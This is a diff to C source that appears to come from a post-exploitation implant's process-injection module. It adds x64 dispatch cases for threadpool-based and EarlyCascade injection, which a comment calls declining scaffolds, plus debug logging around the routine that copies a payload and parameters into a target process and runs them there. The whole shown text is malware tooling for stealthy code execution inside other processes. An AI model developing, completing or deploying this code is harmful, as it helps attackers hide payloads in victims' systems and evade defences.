@@ -109,6 +109,22 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 					return TRUE;
 				break;
 #endif
+			/* 4.12 SafeBreach threadpool family + Outflank EarlyCascade:
+			 * scaffolds - see inject.h; decline so the chain falls through */
+#if defined _M_X64
+			case PI_EXEC_TPDIRECT:
+				if (inject_via_tpdirect(context, (char *)ptr + offset, parameter))
+					return TRUE;
+				break;
+			case PI_EXEC_TPSTARTROUTINESTUB:
+				if (inject_via_tpstart_routine_stub(context, (char *)ptr + offset, parameter))
+					return TRUE;
+				break;
+			case PI_EXEC_EARLYCASCADE:
+				if (context->isSuspended && inject_via_earlycascade(context, (char *)ptr + offset, parameter))
+					return TRUE;
+				break;
+#endif
 			/* try NtQueueApcThread against a suspended process */
 			case PI_EXEC_NTQUEUEAPCTHREAD_S:
 				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
@@ -205,11 +221,14 @@ void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, 
 	int           field = 0;
 	INJECTCONTEXT context;
 
+	spawn_log("ipl: entry len=", (long)length);
 	/* populate our context to avoid the need for other functions to figure out the same crap */
 	populate_inject_context(&context, pi, hProcess, pid);
+	spawn_log("ipl: ctx populated sameArch=", (long)context.sameArch);
 
 	/* if we're a smart inject DLL, act on it */
 	SetupSmartInject(&context, buffer, length);
+	spawn_log("ipl: post-smartinject", 0x7fffffff);
 
 	/* figure out which transform we want to apply. I know this is ugly */
 	if (context.targetArch == INJECT_ARCH_X64)
@@ -224,14 +243,18 @@ void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, 
 	appendl = data_int(&parser);
 	append = data_ptr(&parser, appendl);
 
+	spawn_log("ipl: transforms pre=", (long)prependl);
+	spawn_log("ipl: transforms app=", (long)appendl);
 	/* handle copying our parameter to the remote process, please */
 	if (plen > 0)
 		rparameter = remote_mirror_data(&context, (char *)parameter, plen);
 	else
 		rparameter = NULL;
+	spawn_log("ipl: rparam=", (long)(long long)(size_t)rparameter);
 
 	/* easiest case, nothing needs to happen. Pass the data on as needed */
 	if (prependl == 0 && appendl == 0) {
+		spawn_log("ipl: calling __inj plain", 0x7fffffff);
 		__inject_process_logic(&context, buffer, length, offset, rparameter);
 		return;
 	}
@@ -244,6 +267,7 @@ void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, 
 	offset += prependl;
 
 	/* kick off our process inject call */
+	spawn_log("ipl: calling __inj transformed", 0x7fffffff);
 	__inject_process_logic(&context, bformat_string(&tbuffer), bformat_length(&tbuffer), offset, rparameter);
 
 	/* free everything */
